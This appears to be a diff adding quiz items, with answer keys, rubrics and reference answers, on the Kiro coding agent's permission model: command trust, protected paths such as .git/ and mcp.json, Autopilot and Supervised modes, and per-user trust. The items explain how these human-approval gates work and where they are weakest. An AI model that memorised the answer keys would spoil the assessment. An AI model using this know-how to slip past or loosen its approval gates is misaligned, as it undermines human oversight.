+      /tools trust is session-scoped runtime trust; the Trusted Commands setting is persistent
+      config. Same effect (stop prompting), different lifetime - and note trusting "git push *"
+      removes confirmation, so it is risky for force pushes.
+  - id: kat-400-mc-g
+    tier: 400
+    bloom: analyze
+    difficulty: 468
+    type: multiple_choice
+    prompt: >-
+      The agent has broad command trust and is editing files freely, then tries to write inside
+      .git/. What happens and why?
+    choices:
+      - id: a
+        text: It writes silently because broad trust covers it
+      - id: b
+        text: It errors out because .git cannot be written
+      - id: c
+        text: >-
+          Kiro prompts for approval, because .git/ is a protected path whose always-ask gate cannot
+          be overridden by trust
+      - id: d
+        text: It is permanently blocked with no prompt
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      .git/ is a hardcoded protected path. A write there always requires approval regardless of how
+      broadly commands are trusted - the protected-path gate wins over trust, so the more
+      restrictive outcome (prompt) applies.
+  - id: kat-400-mc-h
+    tier: 400
+    bloom: analyze
+    difficulty: 472
+    type: multiple_choice
+    prompt: >-
+      Why is "trust the read tool everywhere" a meaningfully different risk decision than "trust the
+      write tool everywhere," even though both skip prompts?
+    choices:
+      - id: a
+        text: They carry identical risk because both skip prompts
+      - id: b
+        text: read can delete files, so it is riskier than write
+      - id: c
+        text: write cannot actually change files
+      - id: d
+        text: >-
+          read is non-mutating (exposure risk only), while write mutates state, so trusting write
+          has a far larger destructive blast radius
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Trusting read trades away confidentiality control (the agent can read anything); trusting
+      write trades away integrity control (the agent can change/destroy anything). Mutation is the
+      bigger blast radius.
+  - id: kat-400-mc-i
+    tier: 400
+    bloom: analyze
+    difficulty: 428
+    type: multiple_choice
+    prompt: >-
+      A user expects "/tools reset" to also revert files Kiro changed this session. Diagnose the
+      misconception.
+    choices:
+      - id: a
+        text: >-
+          reset only restores permission state to defaults; reverting file changes is a separate
+          action (Revert all changes / git), not part of permission reset
+      - id: b
+        text: reset reverts both permissions and files
+      - id: c
+        text: reset deletes the repo
+      - id: d
+        text: reset switches to Supervised mode
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Permission reset and filesystem revert are orthogonal. reset re-locks tools; to undo edits you
+      use the Revert control (or version control). Conflating them leaves changes in place.
+  - id: kat-400-mc-j
+    tier: 400
+    bloom: analyze
+    difficulty: 476
+    type: multiple_choice
+    prompt: >-
+      A reviewer claims "Supervised mode is safe because it blocks the agent from running any shell
+      command." Why is this claim imprecise?
+    choices:
+      - id: a
+        text: Supervised mode does block all shell commands by definition
+      - id: b
+        text: >-
+          Supervised gates on turns containing file edits, not on command policy; shell trust is
+          still governed by the trusted-commands settings, so trusted commands can still run
+      - id: c
+        text: Supervised mode trusts all tools automatically
+      - id: d
+        text: Supervised mode disables the shell tool permanently
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Mode (Autopilot/Supervised) controls the edit-review cadence; the trusted-commands policy
+      controls whether a command runs. They are independent, and Supervised is documented as a
+      review workflow, not a security control - it does not block shell by itself.
+  - id: kat-400-mc-k
+    tier: 400
+    bloom: analyze
+    difficulty: 444
+    type: multiple_choice
+    prompt: >-
+      A user assumes that because .kiroignore is a protected path, the agent is hard-blocked from
+      ever modifying it. They are surprised when, after they approve a prompt, the agent edits it.
+      Diagnose the misconception about what "protected path" means.
+    choices:
+      - id: a
+        text: Protected paths are blocked permanently and this must be a bug
+      - id: b
+        text: >-
+          Protected means always-ASK (require explicit human approval), not always-deny - so the
+          agent can change it once the user approves the prompt
+      - id: c
+        text: Protected paths are silently ignored, so no edit could have happened
+      - id: d
+        text: Protected status only applies in Supervised mode
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      "Protected" here means the write always surfaces a confirmation prompt, not that it is
+      forbidden. The user can still approve a legitimate edit; the gate ensures it never happens
+      silently. Always-ask balances safety against the need to edit these files at all.
+  - id: kat-400-mc-l
+    tier: 400
+    bloom: analyze
+    difficulty: 420
+    type: multiple_choice
+    prompt: >-
+      Two MC users debate: 'Per-user trust means a malicious teammate with repo write access can
+      still grant the agent extra trust on MY machine.' What is the accurate rebuttal?
+    choices:
+      - id: a
+        text: Yes - committing a trust file to the repo grants trust to all clones
+      - id: b
+        text: Yes - trust settings propagate automatically through the repo
+      - id: c
+        text: No - but only because git blocks writes to trust files
+      - id: d
+        text: >-
+          No - trust is a local per-user setting, not carried by the repo, so repo contents (even
+          malicious ones) cannot grant trust on another machine
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Trust is the user's own local decision (the Trusted Commands setting / session trust),
+      established per machine. Nothing a teammate commits to the repo becomes trust on your machine.
+  - id: kat-400-mc-m
+    tier: 400
+    bloom: analyze
+    difficulty: 421
+    type: multiple_choice
+    prompt: >-
+      A user allowlists the read tool to reduce prompts and assumes "reads are harmless." Analyze
+      why broadly trusting read still carries a real, if non-destructive, risk.
+    choices:
+      - id: a
+        text: >-
+          Trusting read broadly lets the agent (or an injected prompt) read sensitive files like
+          ~/.ssh or env files and surface their contents - a confidentiality/exfiltration risk, even
+          though nothing is destroyed
+      - id: b
+        text: There is no risk at all because reading never changes state
+      - id: c
+        text: It silently disables the write tool
+      - id: d
+        text: read can only ever open one file per session
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Non-mutating is not harmless: broad read trust widens what the agent (and any prompt
+      injection) can pull in and potentially leak. Scope read trust to what the task needs rather
+      than allowlisting it everywhere.
+  - id: kat-500-ff-a
+    tier: 500
+    bloom: evaluate
+    difficulty: 492
+    type: free_form
+    prompt: >-
+      Critique the anti-pattern of always running Kiro in Autopilot with everything trusted (e.g.
+      --trust-all-tools, or universal command trust) "to move fast." Identify what safety properties
+      are lost, when (if ever) it is acceptable, and a better default posture.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Identifies lost properties - no per-step pause (Autopilot) AND no approval gate
+            (everything trusted), so destructive commands run unprompted
+        - id: c2
+          text: >-
+            States narrow acceptable contexts (throwaway sandbox, ephemeral CI with no secrets/no
+            prod access and only the needed categories)
+        - id: c3
+          text: >-
+            Proposes a better default - Supervised or narrow scoped trust by default, loosening per
+            task risk
+      referenceAnswer: >-
+        Combining Autopilot with blanket trust removes both gates: Autopilot drops the per-step
+        pause and trusting everything drops the approval gate, so writes, shell, and aws run with no
+        human checkpoint and only the after-the-fact diff/revert/interrupt as recourse. It is only
+        defensible in a throwaway sandbox or an ephemeral CI job with no secrets and no prod access,
+        ideally granting only the needed categories via --trust-tools rather than --trust-all-tools.
+        A better default is conservative: Supervised or prompting-by-default, with narrow scoped
+        command trust granted deliberately, loosening to Autopilot only for predictable low-risk
+        work.
+      passThreshold: 0.6
+    guidance: >-
+      Separate the two disabled gates, tie acceptability to blast radius (sandbox/CI) rather than
+      convenience, and prescribe least-privilege defaults (narrow trust, --trust-tools over
+      --trust-all-tools).
+  - id: kat-500-ff-b
+    tier: 500
+    bloom: evaluate
+    difficulty: 504
+    type: free_form
+    prompt: >-
+      Assess Kiro's choice to make trust per-user and stored outside the repo. Argue both the
+      security benefit and the operational cost, then give your overall verdict.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Benefit - a cloned/hostile repo cannot inject trust; trust reflects an actual human
+            decision on that machine
+        - id: c2
+          text: >-
+            Cost - no easy way to standardize/share trust across a team; onboarding friction and
+            per-machine setup
+        - id: c3
+          text: Reaches a defensible overall verdict weighing the two
+      referenceAnswer: >-
+        The security benefit is strong: keeping trust per-user and outside the repo means a cloned
+        or malicious repo cannot ship rules that silently grant the agent power, so every trust
+        grant reflects a real human decision on that machine. The operational cost is that teams
+        cannot simply commit and share a trust baseline; each developer re-establishes trust, adding
+        onboarding friction and requiring out-of-band tooling (managed config) to standardize. On
+        balance the trade favors safety: the injection threat is severe and silent, whereas the
+        friction is manageable with MDM/managed config, so the design is sound.
+      passThreshold: 0.6
+    guidance: >-
+      A good answer weighs a concrete severe threat against a manageable operational cost and lands
+      a verdict, not a both-sides shrug.
+  - id: kat-500-ff-c
+    tier: 500
+    bloom: evaluate
+    difficulty: 516
+    type: free_form
+    prompt: >-
+      A colleague proposes representing "confirm before pushing" by trusting "git push *" and "just
+      remembering not to confirm force pushes." Critique this, and propose a more robust design
+      using Kiro's actual trust model.
+    rubric:
+      criteria:
+        - id: c1
+          text: Notes trusting "git push *" removes the confirmation entirely, the opposite of the goal
+        - id: c2
+          text: >-
+            Critiques relying on human memory as fragile and non-enforcing (and notes prefix trust
+            cannot express an exception for --force)
+        - id: c3
+          text: >-
+            Proposes the correct design - do NOT trust push at all; trust only narrow safe prefixes
+            (git status, git pull), leaving every push to prompt by default
+      referenceAnswer: >-
+        The proposal is self-defeating: trusting "git push *" removes the confirmation, which is the
+        opposite of "confirm before pushing," and "remembering not to confirm force pushes" relies
+        on human discipline rather than enforcement. Kiro's trusted-commands matching is additive
+        prefix-only with no deny/exception, so you cannot trust push-in-general and carve out force.
+        The robust design is the inverse: do not trust push at all; trust only the narrow safe
+        prefixes you actually want frictionless (e.g. "git status", "git pull"), so every push -
+        force or not - falls outside any trusted prefix and prompts by default. Enforcement comes
+        from not granting the trust, not from remembering to decline.
+      passThreshold: 0.6
+    guidance: >-
+      You cannot express "trust push except force" - matching is allow-by-prefix with no exceptions.
+      Encode safety by withholding trust on the dangerous command, not by trusting it and relying on
+      memory.
+  - id: kat-500-ff-d
+    tier: 500
+    bloom: evaluate
+    difficulty: 536
+    type: free_form
+    prompt: >-
+      Kiro layers several controls: mode (Autopilot/Supervised), command trust (prefix-based),
+      hardcoded protected paths, per-user trust isolation, and approval-by-default for untrusted
+      commands. Evaluate this as a defense-in-depth design - what does each layer independently
+      protect, and where is the weakest practical link?
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Maps layers to distinct protections (mode = edit-review cadence; command trust =
+            least-privilege gating on what runs; protected paths = anti-self-escalation around
+            config/git; per-user trust = anti-repo-injection; default approval = fail-safe for the
+            unanticipated)
+        - id: c2
+          text: >-
+            Argues the layers are largely orthogonal so failure of one is partly covered by others
+            (defense in depth)
+        - id: c3
+          text: >-
+            Identifies the weakest practical link as human behavior (e.g. habitual --trust-all-tools
+            / broad prefixes / always-Autopilot) and notes a mitigation
+      referenceAnswer: >-
+        Each layer guards a different axis: mode sets the edit-review cadence (per-edit pause vs
+        after-the-fact diff/revert); command trust enforces least privilege on what runs without
+        prompting; hardcoded protected paths (.git, .vscode, mcp.json, .kiroignore) stop the agent
+        from silently altering config/tooling that could expand its own reach; per-user trust
+        isolation stops a cloned repo from injecting trust; and approval-by-default for anything
+        untrusted is the fail-safe for operations no one anticipated. Because these are largely
+        orthogonal, one failing (say a too-broad trusted prefix) is partly contained by others
+        (protected paths still gate mcp.json; default approval still catches anything outside the
+        trusted prefix). The weakest practical link is human behavior - habitually using
+        --trust-all-tools, trusting broad prefixes, or always running Autopilot collapses several
+        layers at once. The mitigation is policy, not more mechanism: conservative defaults, narrow
+        scoped trust, and graduated autonomy.
+      passThreshold: 0.6
+    guidance: >-
+      Treat the layers as orthogonal controls with defense-in-depth resilience, and locate the
+      residual risk in operator habit (blanket trust / always-Autopilot) rather than any single
+      mechanism.
+  - id: kat-500-ff-e
+    tier: 500
+    bloom: evaluate
+    difficulty: 481
+    type: free_form
+    prompt: >-
+      Compare two onboarding postures for an autonomous coding agent: (A) 'trust nothing, confirm
+      everything' forever, vs (B) graduated autonomy that loosens trust as the user/codebase prove
+      reliable. Evaluate the tradeoffs and recommend a posture.
+    rubric:
+      criteria:
+        - id: c1
+          text: Notes (A) is safest but high-friction and can cause prompt fatigue / rubber-stamping
+        - id: c2
+          text: >-
+            Notes (B) matches autonomy to demonstrated reliability, reducing friction where risk is
+            low
+        - id: c3
+          text: >-
+            Recommends (B) with explicit criteria for graduation rather than permanent (A) or
+            immediate blanket trust
+      referenceAnswer: >-
+        Posture A maximizes gating but its constant prompts cause fatigue, and fatigued users tend
+        to rubber-stamp prompts, eroding the very safety the gates provide. Posture B ties loosening
+        to evidence: as a user shows judgment and a task class proves low-risk, trust widens (scoped
+        command/path trust, eventually Autopilot for predictable work). B is preferable because it
+        concentrates human attention where risk is real and avoids habituation, provided graduation
+        has explicit criteria rather than ad-hoc blanket trust. Pure A is defensible only for the
+        highest-stakes, rarely-touched systems.
+      passThreshold: 0.6
+    guidance: >-
+      Permanent maximal gating backfires via fatigue/rubber-stamping; graduated autonomy with
+      explicit criteria spends human review where it matters.
+  - id: kat-500-ff-f
+    tier: 500
+    bloom: evaluate
+    difficulty: 483
+    type: free_form
+    prompt: >-
+      Critique relying on the per-user trust model as a SECURITY CONTROL against a compromised
+      developer machine (as opposed to against a hostile repo). Where does the model help, and where
+      is it the wrong tool?
+    rubric:
+      criteria:
+        - id: c1
+          text: Notes it genuinely defends against repo-injected trust (untrusted-repo threat)
+        - id: c2
+          text: >-
+            Notes a compromised local machine can already read/modify the user-home trust files, so
+            the model does not contain that attacker
+        - id: c3
+          text: >-
+            Concludes per-user trust is an anti-injection boundary, not an endpoint-compromise
+            control; that needs OS/endpoint security
+      referenceAnswer: >-
+        The per-user model squarely defends the untrusted-repo threat: because trust is the user's
+        own local decision and not carried by the repo, a cloned or hostile repo cannot grant the
+        agent power. But it is the wrong tool against a compromised developer machine: an attacker
+        with local code execution can already read or rewrite the local trust settings directly,
+        outside Kiro's own gates, which protect against the agent self-modifying but not against a
+        separate attacker on the host. So per-user trust is an injection boundary, not an
+        endpoint-compromise control; defending the machine itself requires OS-level and endpoint
+        security, not the trust model.
+      passThreshold: 0.6
+    guidance: >-
+      Right tool for repo-injection, wrong tool for endpoint compromise. A local attacker bypasses
+      the file-based model; that threat needs OS/endpoint controls.
+  - id: kat-500-ff-g
+    tier: 500
+    bloom: evaluate
+    difficulty: 534
+    type: free_form
+    prompt: >-
+      Kiro's trusted-commands matching offers exact match, wildcard/prefix match, and universal
+      trust. An architect proposes dropping the wildcard/prefix form, leaving only exact-command and
+      universal trust 'for simplicity.' Evaluate what safety expressiveness is lost and whether the
+      simplification is worth it.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Identifies the lost middle ground - the wildcard/prefix form (e.g. "npm run *", "git
+            pull *") that trusts a command-with-varying-args without trusting everything
+        - id: c2
+          text: >-
+            Explains losing it forces a bad binary: re-prompt on every flag/arg change (exact) or
+            trust all commands (universal)
+        - id: c3
+          text: >-
+            Reaches a verdict that the prefix form encodes a useful friction/blast-radius middle
+            point and dropping it is a net loss for realistic workflows
+      referenceAnswer: >-
+        Dropping the wildcard/prefix form removes the middle option ("npm run *", "git pull *") that
+        lets users trust a command whose arguments vary while still scoping it to one subcommand.
+        Without it, users face a bad binary: exact-command trust re-prompts on every changed flag or
+        argument (so much friction that people resort to universal trust), or universal trust grants
+        every command (over-broad blast radius). The prefix form is the friction/blast-radius middle
+        point that matches real workflows, where the subcommand is safe but the args change. The
+        simplification trades meaningful least-privilege granularity for marginal conceptual
+        simplicity, so it is a net loss.
+      passThreshold: 0.6
+    guidance: >-
+      The wildcard/prefix form exists precisely to avoid the exact-vs-universal binary; removing it
+      pushes users toward universal trust. That granularity is a feature, not clutter.
+  - id: kat-500-mc-a
+    tier: 500
+    bloom: evaluate
+    difficulty: 482
+    type: multiple_choice
+    prompt: >-
+      A team's default policy is "always start by trusting every command (universal trust) so nobody
+      gets interrupted." What is the best critique?
+    choices:
+      - id: a
+        text: >-
+          It defeats the layered design by removing the approval gate by default, so a single bad
+          inference can cause unbounded damage; trust should be granted narrowly and deliberately
+      - id: b
+        text: It is optimal because fewer prompts always means better security
+      - id: c
+        text: It is fine as long as you are in Supervised mode
+      - id: d
+        text: Universal trust only affects the read tool, so the risk is negligible
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Blanket default trust removes the least-privilege gating the system provides. The better
+      posture is narrow, deliberate trust (specific prefixes) reserved for low-stakes contexts;
+      Supervised does not rescue it because it is review, not a security control.
+  - id: kat-500-mc-b
+    tier: 500
+    bloom: evaluate
+    difficulty: 488
+    type: multiple_choice
+    prompt: >-
+      Evaluate this design claim: "Because deny beats allow, we should write only deny rules and
+      rely on implicit allow for everything else."
+    choices:
+      - id: a
+        text: Strong - denylists are always complete and safe
+      - id: b
+        text: >-
+          Weak - relying on implicit allow means anything not explicitly denied runs unprompted; a
+          default of ask for risky capabilities is safer than enumerate-the-bad
+      - id: c
+        text: Strong - implicit allow is the documented secure default
+      - id: d
+        text: Irrelevant - deny and allow cannot coexist
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Enumerate-the-bad (pure denylist) fails open: any unanticipated risky operation runs. A safer
+      design sets ask/deny defaults for high-risk capabilities and allows narrowly, an allowlist
+      posture.
+  - id: kat-500-mc-c
+    tier: 500
+    bloom: evaluate
+    difficulty: 494
+    type: multiple_choice
+    prompt: >-
+      A reviewer proposes letting repos ship a committed permissions file that auto-grants trust "to
+      reduce onboarding friction." Judge this against Kiro's design.
+    choices:
+      - id: a
+        text: Accept - committed trust files are the industry standard and always safe
+      - id: b
+        text: Accept - as long as the file is YAML
+      - id: c
+        text: >-
+          Reject - it reintroduces the exact repo-injects-trust attack Kiro prevents by keeping
+          trust per-user outside the repo; convenience here trades away a core safety boundary
+      - id: d
+        text: Neutral - it has no security implications
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Per-user trust isolation exists specifically so a cloned/hostile repo cannot grant the agent
+      power. A committed auto-trust file would let any repo you clone authorize itself, the very
+      threat the design closes.
+  - id: kat-500-mc-d
+    tier: 500
+    bloom: evaluate
+    difficulty: 500
+    type: multiple_choice
+    prompt: >-
+      Two policies for a CI job: (A) run headless with --trust-all-tools; (B) run headless with
+      --trust-tools listing only the categories the job needs. Which is the better default and why?
+    choices:
+      - id: a
+        text: A - simplicity always outweighs containment in CI
+      - id: b
+        text: A - CI is trusted so blast radius does not matter
+      - id: c
+        text: They are equivalent because CI has no human present
+      - id: d
+        text: >-
+          B - granting only the needed categories (least privilege) contains damage from a
+          compromised or mis-prompted run, while A grants the whole job unbounded tool access
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Even in CI, --trust-all-tools means any prompt-injection or model error has full tool reach.
+      --trust-tools with only the needed categories preserves automation while bounding worst-case
+      impact.
+  - id: kat-500-mc-e
+    tier: 500
+    bloom: evaluate
+    difficulty: 506
+    type: multiple_choice
+    prompt: >-
+      Critique: "Autopilot is reckless; everyone should always use Supervised." Pick the most
+      balanced evaluation.
+    choices:
+      - id: a
+        text: >-
+          Overstated - Autopilot is appropriate for well-defined, low-risk, repetitive work and
+          retains diff/revert/interrupt; the right control is matching mode to task risk, not
+          banning Autopilot
+      - id: b
+        text: Correct - Autopilot has no safeguards at all
+      - id: c
+        text: Correct - Supervised is strictly more capable
+      - id: d
+        text: Wrong - Supervised is the reckless mode
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Mode is a risk/velocity dial, not a safety on/off switch. Autopilot keeps after-the-fact
+      safeguards; blanket bans waste its value on safe work. Calibrate to task stakes.
+  - id: kat-500-mc-f
+    tier: 500
+    bloom: evaluate
+    difficulty: 512
+    type: multiple_choice
+    prompt: >-
+      Evaluate trusting an exact command string versus a wildcard/prefix pattern for a frequently
+      varied tool like a test runner with changing flags.
+    choices:
+      - id: a
+        text: A prefix pattern is always safer than an exact match
+      - id: b
+        text: >-
+          An exact match is tightest but re-prompts every time a flag changes; a prefix reduces
+          friction at the cost of covering all variations under it - choose based on how dangerous
+          off-pattern uses are
+      - id: c
+        text: They are identical for varied commands
+      - id: d
+        text: An exact match covers all flag variations automatically
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The choice is a friction-vs-blast-radius tradeoff. An exact-string trust is tightest but
+      brittle to changing flags; a prefix is convenient but covers everything under it. The decision
+      hinges on how dangerous unexpected variations could be.
+  - id: kat-500-mc-g
+    tier: 500
+    bloom: evaluate
+    difficulty: 518
+    type: multiple_choice
+    prompt: >-
+      A security review asks why protected paths like .git/ and mcp.json are always-ASK (require
+      confirmation) rather than always-blocked. Is that the right design choice?
+    choices:
+      - id: a
+        text: No - they should be always-allow for convenience
+      - id: b
+        text: No - they should be silently ignored
+      - id: c
+        text: >-
+          Yes - these files are legitimately edited but high-impact, so a confirmation gate balances
+          safety with the need to update them; hard-blocking would prevent normal work
+      - id: d
+        text: Yes - because asking and blocking are functionally identical
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      .git/ (commits, config) and mcp.json (tool/server config) are behavior-affecting but
+      legitimately edited, so an always-ask gate is the proportionate control: it forces a human
+      decision without blocking real work. A hard block would break normal use.
+  - id: kat-500-mc-h
+    tier: 500
+    bloom: evaluate
+    difficulty: 524
+    type: multiple_choice
+    prompt: >-
+      Judge this onboarding rule: "New hires must use Supervised mode and per-request trust; they
+      may graduate to Autopilot and scoped command trust after demonstrating judgment." Strong or
+      weak policy?
+    choices:
+      - id: a
+        text: Weak - everyone should start by trusting everything to learn faster
+      - id: b
+        text: Weak - mode and trust are unrelated to experience
+      - id: c
+        text: Strong only if they skip Supervised entirely
+      - id: d
+        text: >-
+          Strong - it starts at low autonomy/low trust where blast radius matters most and loosens
+          deliberately as competence is shown, matching autonomy to demonstrated judgment
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Graduated autonomy is sound: conservative defaults bound early-mistake damage, and explicit
+      graduation ties loosening to evidence of judgment rather than convenience.
+  - id: kat-500-mc-i
+    tier: 500
+    bloom: evaluate
+    difficulty: 486
+    type: multiple_choice
+    prompt: >-
+      Evaluate: "Reading is harmless, so we should allowlist the read tool broadly to save prompts."
+      What is the key risk being underweighted?
+    choices:
+      - id: a
+        text: >-
+          Broad read trust lets the agent read secrets and files far beyond the task (e.g. ~/.ssh,
+          env files), an exfiltration/confidentiality risk
+      - id: b
+        text: There is no added risk because reading never changes anything
+      - id: c
+        text: It would disable the write tool
+      - id: d
+        text: Broad read trust is required for Autopilot to function
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Non-mutating does not mean harmless: broad read trust expands what the agent (and any injected
+      prompt) can pull in and potentially leak. Scope read trust to what the task needs rather than
+      allowlisting it everywhere.
+  - id: kat-500-mc-j
+    tier: 500
+    bloom: evaluate
+    difficulty: 530
+    type: multiple_choice
+    prompt: >-
+      A platform team wants one global trust policy committed and enforced for all developers. Given
+      Kiro's per-user, machine-local trust model, what is the soundest assessment?
+    choices:
+      - id: a
+        text: Just commit a trust file to the repo; Kiro enforces it for everyone
+      - id: b
+        text: >-
+          Per-user trust resists repo injection but is not a centralized enforcement mechanism;
+          org-wide policy needs an out-of-band channel (e.g. MDM-managed settings) rather than
+          expecting the repo to enforce it
+      - id: c
+        text: It is impossible to standardize anything, so give up
+      - id: d
+        text: Trust everything in CI and developers will inherit it
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The per-user model is a safety feature, not a fleet-management one. Centralized policy must be
+      pushed via managed device/settings tooling, acknowledging the deliberate gap that repos cannot
+      dictate trust and CI trust does not transfer to developer machines.
+  - id: kat-500-mc-k
+    tier: 500
+    bloom: evaluate
+    difficulty: 484
+    type: multiple_choice
+    prompt: >-
+      Evaluate: a team disables Supervised entirely and mandates Autopilot for ALL work 'because
+      reverts exist, so nothing can go wrong.' Best critique?
+    choices:
+      - id: a
+        text: Correct - revert fully reverses any action Kiro takes
+      - id: b
+        text: Correct - Autopilot is strictly safer than Supervised
+      - id: c
+        text: >-
+          Reverts only restore local files; they do not undo side effects like pushed commits,
+          deleted cloud resources, or sent emails, so 'revert exists' does not justify blanket
+          Autopilot on high-side-effect work
+      - id: d
+        text: Incorrect only because Autopilot is slower than Supervised
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Revert is a local-filesystem undo. Actions with external side effects (git push, aws deletes,
+      network calls) are not reversed by revert, so relying on it to justify universal Autopilot
+      underestimates blast radius on side-effecting tasks.
+  - id: kat-500-mc-l
+    tier: 500
+    bloom: evaluate
+    difficulty: 480
+    type: multiple_choice
+    prompt: >-
+      Judge this habit on a machine used across many projects: 'Whenever one project needs a broad
+      trusted prefix, just add it to my persistent Trusted Commands setting and leave it there.'
+    choices:
+      - id: a
+        text: Strong - more persistent trust always means less friction and is therefore better
+      - id: b
+        text: Strong - persistent trust is the only kind that exists
+      - id: c
+        text: Neutral - persistent and session trust are functionally identical
+      - id: d
+        text: >-
+          Weak - the persistent setting applies to every project you use, so a broad prefix added
+          for one project silently trusts it everywhere; prefer narrow patterns or session-only
+          /tools trust for one-off needs
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      The persistent Trusted Commands setting is not project-scoped - it follows you across all
+      projects. A broad pattern added for one project leaks its trust into every other. Keep
+      persistent patterns narrow, and use session-scoped /tools trust for project-specific one-offs.
+  - id: kat-500-mc-m
+    tier: 500
+    bloom: evaluate
+    difficulty: 528
+    type: multiple_choice
+    prompt: >-
+      A reviewer proposes removing the always-ASK gate on mcp.json 'because the agent just needs to
+      add a helpful server, so re-confirming is redundant.' Best evaluation?
+    choices:
+      - id: a
+        text: >-
+          Reject - mcp.json defines which MCP servers and tools the agent can use, so unconfirmed
+          edits let the agent expand its own tool surface; the ask gate is a deliberate
+          self-modification checkpoint
+      - id: b
+        text: Accept - mcp.json is harmless metadata
+      - id: c
+        text: Accept - the gate only slows things down with no safety value
+      - id: d
+        text: Neutral - mcp.json is never read
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      mcp.json controls which servers and tools are available, so letting the agent rewrite it
+      unconfirmed lets it grant itself new capabilities. The always-ask gate is an intentional
+      checkpoint against silent self-modification, not redundant friction.
